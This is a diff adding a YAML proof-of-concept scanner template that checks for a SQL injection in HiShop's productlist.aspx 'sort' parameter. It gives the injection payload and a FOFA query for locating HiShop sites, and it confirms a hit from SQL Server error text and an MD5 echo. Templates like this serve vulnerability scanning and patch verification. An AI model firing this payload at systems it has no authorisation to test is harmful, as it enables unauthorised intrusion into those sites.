@@ -1,0 +1,17 @@
+id: poc-yaml-hishop-productlist-sqli
+info:
+  name: hishop productlist SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: hishop
+  fofa: app="HiShop"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))
+  expression: status_code == 200 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,t2)
+transport: http
